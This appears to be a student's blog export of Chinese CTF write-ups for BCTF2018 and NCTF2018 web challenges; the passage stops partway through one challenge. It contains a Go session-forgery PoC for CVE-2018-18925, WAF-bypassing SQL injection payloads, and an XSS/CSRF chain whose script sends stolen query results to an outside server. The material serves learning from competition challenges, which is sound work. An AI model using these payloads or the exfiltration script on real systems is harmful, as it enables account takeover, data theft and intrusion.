<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>BCTF2018-web(1)</title>
      <link href="/2018/12/03/BCTF2018-web-1/"/>
      <url>/2018/12/03/BCTF2018-web-1/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>总结一下BCTF2018的解题过程，这篇博客只有其中三道题，包括但不仅限于gogs框架的任意用户登录漏洞、SQL报错注入、XSS。</p><p>虽然自己做的时候都没做出来，但在看wp的过程中回顾自己的思路时，从中发现了自己的思路偏在哪里了，有哪些从前没想过的切入点。</p><a id="more"></a><h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><p>输入一个不存在的url，看到404报错，提示：</p><p><code>Powered by beego 1.7.2</code></p><p>思路是老大提供的</p><p>关于gitea/gogs的CVE-2018-18925/6任意用户登录/代码执行漏洞</p><p>go-macaron(<a href="https://github.com/go-macaron/session" target="_blank" rel="noopener">https://github.com/go-macaron/session</a> version&lt;0.4.0)</p><p>beego(<a href="https://github.com/astaxie/beego" target="_blank" rel="noopener">https://github.com/astaxie/beego</a> version&lt;1.11.0)</p><p>都存在这个问题，p神的vulhub中也有这个洞的docker：<a href="https://github.com/vulhub/vulhub/tree/master/gogs/CVE-2018-18925" target="_blank" rel="noopener">CVE-2018-18925</a> </p><p>以文件存储session，且sessionid没有过滤<code>./</code>的时候导致可以用任意文件作为session</p><p>所以这道题可以在头像上传处上传伪造的session文件，再用sessionid包含即可伪造身份为admin </p><p>这里不能使用之前的poc构造session文件了，要改一下，我当时做题时就不知道怎么改，现在学到了一些思路。</p><p>先上传一个0B的图片，把session设置成该地址，登陆后下载头像，解析其中的字段类型，发现两项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UID int</span><br><span class="line">username string</span><br></pre></td></tr></table></figure><p>可以直接改CVE-2018-18925的poc为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;bytes&quot;</span><br><span class="line">    &quot;encoding/gob&quot;</span><br><span class="line">    &quot;encoding/hex&quot;</span><br><span class="line">    &quot;fmt&quot;</span><br><span class="line">    &quot;io/ioutil&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func EncodeGob(obj map[interface&#123;&#125;]interface&#123;&#125;) ([]byte, error) &#123;</span><br><span class="line">    for _, v := range obj &#123;</span><br><span class="line">        gob.Register(v)</span><br><span class="line">    &#125;</span><br><span class="line">    buf := bytes.NewBuffer(nil)</span><br><span class="line">    err := gob.NewEncoder(buf).Encode(obj)</span><br><span class="line">    return buf.Bytes(), err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    var uid int64 = 1</span><br><span class="line">    obj := map[interface&#123;&#125;]interface&#123;&#125;&#123;&quot;username&quot;: &quot;admin&quot;, &quot;UID&quot;: uid&#125;</span><br><span class="line">    data, err := EncodeGob(obj)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    err = ioutil.WriteFile(&quot;test2.png&quot;, data, 0777)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    edata := hex.EncodeToString(data)</span><br><span class="line">    fmt.Println(edata)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跑完poc得到一段十进制数据</p><img src="/2018/12/03/BCTF2018-web-1/1.png"><p>放到<a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">CyberChef</a>的<code>From HEX</code>功能中，存个poc.jpg</p><img src="/2018/12/03/BCTF2018-web-1/2.png"><p>上传poc.jpg后修改sessionid为上传的返回地址<code>../../../../../../go/src/github.com/checkin/website/static/img/avatar/xxxxxxx.png</code>，登陆到admin用户，访问Admin Panel得到flag</p><img src="/2018/12/03/BCTF2018-web-1/3.png"><h1 id="babySQLiSPA"><a href="#babySQLiSPA" class="headerlink" title="babySQLiSPA"></a>babySQLiSPA</h1><p>这道题我第一眼看了以为是二次注入，然后在二次注入的路上越走越远，直到这道题官方的hint给了waf。</p><p>注册用户名的时候发现限定了<code>[a-zA-Z0-9]</code>，把其它的都过滤了， 所以没法二次注入了。</p><p>r3kapig的writeup中提到，在看网页源码时发现是用webpack打包的，用webpack打包过后会生成.map文件，于是访问main.dfa730c5.js.map，在其中可以发现两个没有用到的api：</p><img src="/2018/12/03/BCTF2018-web-1/4.png"><img src="/2018/12/03/BCTF2018-web-1/5.png"><p>searchHints中用到的captcha就是从getCaptcha中得到的，于是：</p><img src="/2018/12/03/BCTF2018-web-1/6.png"><p>/api/hints可以注入，且报错回显。</p><p>看一下给的WAF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export function checkHint (hint) &#123;</span><br><span class="line">  return ! / |;|\+|-|\*|\/|&lt;|&gt;|~|!|\d|%|\x09|\x0a|\x0b|\x0c|\x0d|`|gtid_subset|hash|json|st\_|updatexml|extractvalue|floor|rand|exp|json_keys|uuid_to_bin|bin_to_uuid|union|like|sleep|benchmark/ig.test(hint)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用报错函数<code>gtid_subtract()</code>绕过</p><p><code>hints:&#39;or(gtid_subtract((select(group_concat(table_name))from(information_schema.tables)where((table_schema=database()))),&#39;&#39;))or&#39;</code></p><img src="/2018/12/03/BCTF2018-web-1/7.png"><p>但发现返回的表名都是乱码，因为GTID_SUBTRACT()的报错信息有长度限制，最多140字节，Nu1L是限制表名长度来提取的，长度为30的时候拿到flag表”vhEFfFlLlLaAAaaggIiIIsSSHeReEE “</p><p>payload：<code>hint=&#39;or(gtid_subtract((select(group_concat(table_name))from(information_schema.tables)where((length(table_name)=ord(&#39;j&#39;)^ord(&#39;t&#39;)))),&#39;&#39;))or&#39;</code></p><p>这里也可以引入reverse()函数倒序查看表名</p><img src="/2018/12/03/BCTF2018-web-1/8.png"><p>然后再爆列名：<code>hint=&#39;||gtid_subtract((select(concat(column_name))from(information_schema.columns)where(table_name=&#39;vhEFfFlLlLaAAaaggIiIIsSSHeReEE&#39;)),&#39;&#39;)#</code></p><p>报错信息：<code>{&quot;error&quot;:&quot;Malformed GTID set specification &#39;ZSLRSrpOlCCysnaHUqCEIjhtWbxbMlDkUO&#39;.&quot;}</code></p><p>最后的payload：<code>hints:&#39;||gtid_subtract((select(ZSLRSrpOlCCysnaHUqCEIjhtWbxbMlDkUO)from(vhEFfFlLlLaAAaaggIiIIsSSHeReEE)),&#39;&#39;)#</code>.</p><img src="/2018/12/03/BCTF2018-web-1/9.png"><p>这道题主要没想到sql注入的位置，学习了一种报错注入用的函数。</p><h1 id="SEAFARING1"><a href="#SEAFARING1" class="headerlink" title="SEAFARING1"></a>SEAFARING1</h1><p>做这道题时发现login处有个XSS，之前没做过XSS的题，登陆的时候需要验证码，也没发现有什么用。</p><p>还有一个robots.txt提示文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /admin/handle_message.php</span><br></pre></td></tr></table></figure><p><code>view-source:http://seafaring.xctf.org.cn:9999/admin</code>可以看到后台的部分源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function view_uid(uid) &#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type: &quot;POST&quot;,</span><br><span class="line">            url: &quot;/admin/handle_message.php&quot;,</span><br><span class="line">            data: &#123;&quot;token&quot;: csrf_token, &quot;action&quot;: &quot;view_uid&quot;, &quot;uid&quot;: uid&#125;,</span><br><span class="line">            dataType: &quot;json&quot;,</span><br><span class="line">            success: function (data) &#123;</span><br><span class="line">                if (!data[&quot;error&quot;]) &#123;</span><br><span class="line">                    data = data[&apos;result&apos;];</span><br><span class="line">                    var Status = &apos;&apos;;</span><br><span class="line">                    $(&apos;#timestamp&apos;).text(data[&apos;timestamp&apos;]);</span><br><span class="line">                    $(&apos;#username&apos;).text(data[&apos;user_name&apos;]);</span><br><span class="line">                    $(&apos;#message&apos;).text(data[&apos;message&apos;]);</span><br><span class="line">                    document.getElementById(&quot;replyuid&quot;).value=data[&apos;uid&apos;];</span><br><span class="line">                    if (parseInt(data[&apos;is_checked&apos;]) == 1) &#123;</span><br><span class="line">                        Status = &apos;&lt;div style=&quot;color:#04FF00&quot;&gt;Checked&lt;/div&gt;&apos;;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        Status = &apos;&lt;div style=&quot;color:#FFA500&quot;&gt;Not Checked&lt;/div&gt;&apos;;</span><br><span class="line">                    &#125;</span><br><span class="line">                    document.getElementById(&quot;status&quot;).innerHTML = Status;</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                    alert(&apos;Error: &apos; + data[&quot;error&quot;]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>进到<code>/admin/handle_message.php</code>中，提示：</p><p><code>{&quot;result&quot;:&quot;&quot;,&quot;error&quot;:&quot;CSRFToken &#39;&#39;is not correct&quot;}</code></p><p>注意到error双引号内部有个’’，猜测传入的csrftoken可能直接输出到了页面中 </p><p>结合源码，发现csrftoken通过token参数使用post方法传入</p><p><img src="C:\Users\dell\AppData\Local\Temp\1543840568134.png" alt="1543840568134"></p><p>传入后会回显token值，存在反射型XSS，构造类似<code>&lt;img src=1 onerror=alert(/xss/)&gt;</code>的payload时会发现对’/‘转义了。</p><p>接下来构造一个页面让管理员访问，这道题的评论链接会被bot机器人主动访问，因此构造csrf的html页面让bot访问。</p><p>之前发现了’/‘被转义了，所以这里我们使用svg或img进行xss，同时为了避免引号的问题，使用fromCharCode()方法或者使用base64编码再用atob()函数解码的方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String.fromCharCode(numX,numX,...,numX)</span><br><span class="line">fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串。</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">numX一个或多个 Unicode 值，即要创建的字符串中的字符的 Unicode 编码。</span><br></pre></td></tr></table></figure><p>html页面为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    window.onload =function()&#123;</span><br><span class="line">      document.getElementById(&quot;f&quot;).submit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">  &lt;form method=&quot;post&quot; action=&quot;http://seafaring.xctf.org.cn:9999/admin/handle_message.php&quot; id=&quot;f&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;input name=&quot;token&quot; value=&quot;&lt;body&gt;&lt;img src=x onerror=eval(atob(&apos;cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8veHNzcHQuY29tL0dDNkRURz8nK01hdGgucmFuZG9tKCk=&apos;))&gt;&lt;/body&gt;&quot;&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这里的value内容也可以替换为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;&lt;img src=x onerror=eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,41,46,115,114,99,61,39,104,116,46,99,110,47,69,121,76,83,53,99,103,39))&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>注释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;atob(&apos;cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8veHNzcHQuY29tL0dDNkRURz8nK01hdGgucmFuZG9tKCk=&apos;)</span><br><span class="line"></span><br><span class="line">&quot;s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://xsspt.com/GC6DTG?&apos;+Math.random()&quot;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;String.fromCharCode(100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,41,46,115,114,99,61,39,104,116,46,99,110,47,69,121,76,83,53,99,103,39)</span><br><span class="line"></span><br><span class="line">&quot;document.body.appendChild(document.createElement(&apos;script&apos;)).src=&apos;ht.cn/EyLS5cg&apos;&quot;</span><br></pre></td></tr></table></figure><p>这里的链接地址是在xss平台上面建立的项目，引入js文件</p><img src="/2018/12/03/BCTF2018-web-1/10.png"><p>当然也可以把js文件放在自己的vps上面</p><p>外部引入的js文件（Nu1l的师傅写的 ）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function req(url,data)&#123;</span><br><span class="line">    var xhr = new XMLHttpRequest();</span><br><span class="line">    xhr.open(&quot;POST&quot;,url,false);</span><br><span class="line">    xhr.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">    xhr.send(data);</span><br><span class="line">    var resp = xhr.responseText;</span><br><span class="line">    return resp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getcsrf()&#123;</span><br><span class="line">    var xhr = new XMLHttpRequest();</span><br><span class="line">    xhr.open(&quot;GET&quot;,&quot;http://seafaring.xctf.org.cn:9999/admin/index.php&quot;,false);</span><br><span class="line">    xhr.send();</span><br><span class="line">    var res = xhr.responseText;</span><br><span class="line">    var csrftoken = res.match(/csrf_token = \&quot;([a-z0-9]*)\&quot;/ig)[0].split(&apos;= &quot;&apos;)[1].replace(&apos;&quot;&apos;,&apos;&apos;);</span><br><span class="line">    return csrftoken;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function send(data)&#123;</span><br><span class="line">    location.href = &quot;http://47.95.10.238/bctf.php?data=&quot;+escape(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var ress = req(&quot;http://172.20.0.2:6379/&quot;,&quot;token=&quot;+getcsrf()+&quot;&amp;action=view_unreads&amp;status=3%20%20and%201%3D2%20union%20select%201%2Cload_file%280x2f70726f632f6e65742f617270%29%2C3%2C4%20from%20f111111ag%23&quot;);</span><br><span class="line"></span><br><span class="line">send(ress);</span><br></pre></td></tr></table></figure><p>send()函数中的href是自己的vps</p><p>发现返回了<code>sqlquery debug</code>信息 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;result&quot;:&quot;&quot;,&quot;error&quot;:&quot;sql query error! debug info:SELECT timestamp,user_name,uid,is_checked,message FROM feedbacks where uid=&apos;1&apos; ORDER BY id DESC &quot;&#125;</span><br></pre></td></tr></table></figure><p>有一个接口存在数字型注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;result&quot;:&quot;&quot;,&quot;error&quot;:&quot;sql query error! debug info:SELECT timestamp,user_name,uid,is_checked FROM feedbacks  where is_checked=1\\&apos; ORDER BY id DESC limit 0,50&quot;&#125;</span><br></pre></td></tr></table></figure><p>爆表爆字段最后拿flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;result&quot;:[[&quot;1&quot;,&quot;admin,f111111ag,feedbacks&quot;,&quot;3&quot;,&quot;4&quot;]],&quot;error&quot;:&quot;&quot;&#125;</span><br><span class="line">&#123;&quot;result&quot;:[[&quot;1&quot;,&quot;flllllag&quot;,&quot;3&quot;,&quot;4&quot;]],&quot;error&quot;:&quot;&quot;&#125;</span><br><span class="line">&#123;&quot;result&quot;:[[&quot;1&quot;,&quot;bctf&#123;XsS_SQL1_7438x_2xfccmk&#125;&quot;,&quot;3&quot;,&quot;4&quot;]],&quot;error&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>xss是很久之前看的了，一直没有像这样进行一次系统的利用过，这次算是了了一桩心愿</p><p>大二上学期接下来的日子准备复习四级，复习期末，学一些渗透姿势和python，闲暇时打打ctf，就过去了</p><p>十二月了，要买回家的车票了，这次不想坐飞机，看不到沈阳的雪了</p><p>周末看了将夜，很久前看过的小说拍剧了，很好看</p><p>红墙白雪，要你喜欢。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>NCTF 2018</title>
      <link href="/2018/11/29/NCTF-2018/"/>
      <url>/2018/11/29/NCTF-2018/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上周末的nctf，自己除了签到也就做出来两道题，然后参考了一些网上师傅们赶出来的writeup整理出这篇博客。</p><p>前天和师傅们去做了BCTF的题，ctf从入门到自闭啊，现在只是知道了第一题的思路，其他的还在边看边等大佬们的writeup，所以先写一下今天复盘的nctf了~</p><p>很烦的是我写这篇博客的时候平台服务器坏掉了，我做的时候还有一些没截图</p><p>github上的环境师傅们还没传完，我也懒得再搭环境截图了，我会尽量把学到的知识和思路讲解的清楚一些，大家如果想复现可以到这里找一下环境：<a href="https://github.com/NJUPT-coding-gay/NCTF2018" target="_blank" rel="noopener">传送门</a></p><a id="more"></a><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><img src="/2018/11/29/NCTF-2018/1.jpg"><p>点开链接发现跳到了百度，应该是重定向，burp抓个包重放一下就拿到flag了。</p><h2 id="滴！晨跑打卡"><a href="#滴！晨跑打卡" class="headerlink" title="滴！晨跑打卡"></a>滴！晨跑打卡</h2><img src="/2018/11/29/NCTF-2018/2.jpg"><p>一道sql注入的题，是我做出来的第一道题，这道题闭合一下单引号绕一下空格就可以了，绕空格的一些常见方法如下：</p><p><code>%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/</code></p><p>我看网上的师傅们使用%a0绕过的，我当时好像是用%0b绕过的，但是不重要啦</p><p>构造回显payload<code>?id=1&#39;%a0union%a0select%a01,2,3%a0and&#39;1&#39;=&#39;1</code></p><img src="/2018/11/29/NCTF-2018/9.jpg"><p>然后就开始常规的通过information_schema爆库爆表爆字段了</p><p>最后的payload为 <code>?id=1&#39;%a0union%a0select%a01,(select%a0th1s_1s_flag%a0from%a0flaaaaaaag.f144444444g),3%a0&#39;</code></p><img src="/2018/11/29/NCTF-2018/10.jpg"><h2 id="Go-Lakers"><a href="#Go-Lakers" class="headerlink" title="Go Lakers"></a>Go Lakers</h2><img src="/2018/11/29/NCTF-2018/3.jpg"><p>这题开始做的有点迷啊，还是余师傅提醒，burp重放之后响应包往下拉了好久看到了提示 <code>&lt;!--post me viewsource--&gt;</code></p><p>重放个post变量viewsource拿到了源代码，这里要注意一下改成POST包时要加一个头部字段 <code>Content-type:application/x-www-form-urlencoded</code>，在burp中看响应包会有很多html实体编码和php的代码高亮，这咋看得懂。跟学长学习了放在proxy里面forward一下就显示在浏览器里了，hhh又暴露了自己的菜啊</p><p>源码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">include &apos;getip.php&apos;; </span><br><span class="line">ini_set(&apos;open_basedir&apos;,&apos;.&apos;); </span><br><span class="line">if(isset($_POST[&apos;viewsource&apos;]))&#123;</span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line">die(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">mt_srand(mktime()+$seed); </span><br><span class="line"></span><br><span class="line">function de_code($value)&#123; </span><br><span class="line">$value = base64_decode($value); </span><br><span class="line">$result = &apos;&apos;; </span><br><span class="line">for($i=0;$i&lt;strlen($value);$i++)&#123; </span><br><span class="line">$result .= chr(ord($value[$i])-$i*2); </span><br><span class="line">&#125; </span><br><span class="line">return $result; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if(!(getip() === &apos;127.0.0.1&apos; &amp;&amp; file_get_contents($_GET[&apos;9527&apos;]) === &apos;nctf_is_good&apos; &amp;&amp; mt_rand(1,10000) === intval($_GET[&apos;go_Lakers&apos;])))&#123;</span><br><span class="line">header(&apos;location:https://bbs.hupu.com/24483652.html?share_from=kqapp&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">   else&#123; echo &apos;great&apos;; </span><br><span class="line">   &#125; </span><br><span class="line">   echo file_get_contents(de_code($_GET[&apos;file_&apos;])); </span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt;&lt;title&gt;嘻嘻嘻&lt;/title&gt;&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;h3&gt;题目在哪呢&lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这道题我开始的思路是要先满足if的条件，然后才能考虑file_get_contents()函数，不然就被重定向走了，还是问了一下余师傅才知道，这里在burp中follow只是加了个header头，但还是会执行下面的file_get_contents()语句。那就可以直接根据上面的de_code()函数写个编码的脚本就ok辣，要猜到flag藏在flag.php文件中哦。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function en_code($value)&#123; </span><br><span class="line">$result = &apos;&apos;; </span><br><span class="line">for($i=0;$i&lt;strlen($value);$i++)&#123; </span><br><span class="line">$result .= chr(ord($value[$i])+$i*2); </span><br><span class="line">&#125; </span><br><span class="line">$result = base64_encode($result); return $result; </span><br><span class="line">&#125; </span><br><span class="line">echo en_code(&apos;flag.php&apos;); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>得到Zm5lbTZ6dH4=，用get传一下拿到flag</p><h2 id="全球最大交友网站"><a href="#全球最大交友网站" class="headerlink" title="全球最大交友网站"></a>全球最大交友网站</h2><img src="/2018/11/29/NCTF-2018/4.jpg"><p>这道题，是 .git 泄露，其实当时想到了，但是中途死于对git的操作一知半解吧</p><p>从p神的一篇文章中学习一下git获取源码的利用和原理：<a href="https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html" target="_blank" rel="noopener">XDCTF2015代码审计全解</a></p><p>我当时进行了第一步操作，利用lijiejie的GitHack：<code>https://github.com/lijiejie/GitHack</code> 脚本获取到了一个readme.md文件，内容为<code>Allsource files areingit tag1.0</code> ，考虑flag会在tag1.0版本中，应该要回滚版本。</p><p>在看师傅们writeup的时候发现一个可以将各个版本的源码提取出来的神器：<a href="https://github.com/style-404/Git_Extract" target="_blank" rel="noopener">Git_Extract</a></p><p>还有师傅用了 <a href="https://github.com/denny0223/scrabble" target="_blank" rel="noopener">scrabble</a> 脚本</p><p><code>git log</code>查看历史版本，<code>git show HEAD 版本号</code> 回滚版本，flag在readme.txt中</p><p>这时候我突然想起来之前做cgctf用过的 <a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a> 应该也可以吧，但是服务器已经关了没办法尝试了，以后再遇到类似的题再多尝试一下吧</p><h2 id="小绿草之最强大脑"><a href="#小绿草之最强大脑" class="headerlink" title="小绿草之最强大脑"></a>小绿草之最强大脑</h2><img src="/2018/11/29/NCTF-2018/5.jpg"><p>查看源代码得到hint </p><img src="/2018/11/29/NCTF-2018/11.jpg"><p>当时做题时一脸懵逼，源码泄露在哪里。</p><p>之后看wp文中师傅说到 “第一反应就是CTF中常有的BAK文件“</p><p>访问index.php.bak下载文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_SESSION[&apos;ans&apos;]) &amp;&amp; isset($_POST[&apos;ans&apos;]))&#123;</span><br><span class="line"> if(($_SESSION[&apos;ans&apos;])+intval($_POST[&apos;input&apos;])!=$_POST[&apos;ans&apos;])&#123;</span><br><span class="line">  session_destroy();</span><br><span class="line">  echo &apos;</span><br><span class="line">  &lt;script language=&quot;javascript&quot;&gt;  </span><br><span class="line">  alert(&quot;怎么没算对呢？&quot;);  </span><br><span class="line">  window.history.back(-1);  &lt;/script&gt;&apos;;</span><br><span class="line"> &#125;</span><br><span class="line"> else&#123;</span><br><span class="line">  if(intval(time())-$_SESSION[&apos;time&apos;]&lt;1)&#123;</span><br><span class="line">   session_destroy();</span><br><span class="line">   echo &apos;</span><br><span class="line">   &lt;script language=&quot;javascript&quot;&gt;  